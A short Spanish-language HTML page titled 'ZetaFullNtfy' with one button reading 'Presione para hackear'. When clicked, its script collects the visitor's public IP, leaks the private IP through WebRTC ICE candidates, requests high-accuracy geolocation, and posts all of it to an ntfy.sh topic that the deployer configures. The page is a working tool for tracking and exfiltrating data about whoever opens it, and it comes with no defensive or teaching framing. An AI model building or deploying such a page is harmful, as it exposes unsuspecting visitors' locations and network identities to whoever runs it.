<!DOCTYPE html>
<html lang="es-Zeta">
<head>
  <meta charset="UTF-8">
  <title>ZetaFullNtfy</title>
  <style>
    html,body{margin:0;height:100%;background:#000;color:#0f0;font-family:monospace;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center}
    button{padding:22px 44px;font-size:1.8rem;background:#0f0;color:#000;border:none;border-radius:10px;cursor:pointer}
    button:hover{background:#0c0}
    #msg{margin-top:20px;font-size:1.2rem;max-width:90%}
  </style>
</head>
<body>
  <button id="btn">Presione para hackear</button>
  <div id="msg"></div>

  <script>
    /* ---------- CONFIG ---------- */
    const NTFY = "https://ntfy.sh/n9Js9klak";  // <-- tu tema aquí
    /* ----------------------------- */

    const msg = t => document.getElementById("msg").innerText = t;

    document.getElementById("btn").onclick = async () => {
      msg("Extrayendo datos…");
      try {
        /* IP pública */
        const ipPub = await fetch("https://api.ipify.org?format=text").then(r => r.text()).catch(() => "error");

        /* IP privada vía WebRTC */
        let ipPriv = "noWebRTC";
        try {
          const pc = new RTCPeerConnection({iceServers: []});
          pc.createDataChannel("");
          await pc.createOffer().then(o => pc.setLocalDescription(o));
          ipPriv = await new Promise((res) => {
            pc.onicecandidate = e => {
              if (!e.candidate) return;
              const ip = e.candidate.candidate.split(" ")[4];
              if (ip.match(/^\d+\.\d+\.\d+\.\d+$/)) res(ip);
            };
            setTimeout(() => res("timeout"), 2000);
          });
          pc.close();
        } catch {}

        /* Ubicación */
        const pos = await new Promise((res, rej) => {
          navigator.geolocation.getCurrentPosition(res, rej, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          });
        });
        const lat = pos.coords.latitude.toFixed(6);
        const lon = pos.coords.longitude.toFixed(6);
        const acc = pos.coords.accuracy.toFixed(0);

        /* Montar mensaje crudo */
        const texto = `ZetaFull
IP pública: ${ipPub}
IP privada: ${ipPriv}
Ubicación: lat=${lat}, lon=${lon}, precisión=${acc}m
Timestamp: ${new Date().toLocaleString()}`;

        /* Enviar a ntfy */
        await fetch(NTFY, {
          method: "POST",
          body: texto,
          headers: {"Content-Type": "text/plain"}
        });

        msg("✅ Datos enviados a ntfy");
        document.getElementById("btn").style.display = "none";

      } catch (e) {
        msg("❌ Fallo: " + e.message);
      }
    };
  </script>
</body>
</html>
